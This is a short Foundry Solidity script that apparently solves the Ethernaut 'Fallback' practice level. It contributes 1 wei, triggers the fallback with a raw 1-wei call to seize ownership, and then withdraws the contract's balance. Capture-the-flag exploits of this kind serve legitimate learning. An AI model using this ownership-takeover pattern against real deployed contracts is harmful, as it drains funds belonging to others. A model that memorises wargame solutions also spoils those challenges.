// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";

import {Fallback} from "../src/Fallback.sol";

contract FallbackSolution is Script {
    Fallback instance = Fallback(payable(0x1E3394D1C34467f904E5CB123b0eb559aC3F3A37)); // paste instance address

    function run() external {
        vm.startBroadcast();
        instance.contribute{value: 1 wei}();
        address(instance).call{value: 1 wei}("");
        instance.withdraw();
        vm.stopBroadcast();
    }
}
